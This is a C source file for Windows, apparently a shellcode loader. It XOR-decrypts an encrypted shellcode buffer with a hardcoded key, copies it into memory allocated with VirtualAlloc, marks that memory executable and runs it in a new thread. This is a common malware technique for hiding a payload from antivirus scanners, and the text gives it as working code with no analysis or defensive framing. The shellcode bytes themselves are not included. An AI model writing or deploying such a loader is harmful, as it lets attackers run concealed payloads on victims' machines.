// XOR encrypt/decrypt function
void xor_encrypt_decrypt(uint8_t* data, size_t data_len, const char* key) {
  size_t key_len = strlen(key);
  for (size_t i = 0; i < data_len; i++) {
    data[i] ^= key[i % key_len]; // XOR with repeating key
  }
}


int main()
{
  // allocate the memory
  LPVOID allocateMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  const char* key = "secret";  // key
  xor_encrypt_decrypt(shellcode, sizeof(shellcode), key);

  // copy the shellcode to allocate memory
  RtlMoveMemory(allocateMem, shellcode, sizeof(shellcode));

  // make it executable
  DWORD oldprotect = 0;
  VirtualProtect(allocateMem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect);

  // execute it
  HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocateMem, NULL, NULL, NULL);
  WaitForSingleObject(hThread, INFINITE);
  CloseHandle(hThread);

  return 0;
}
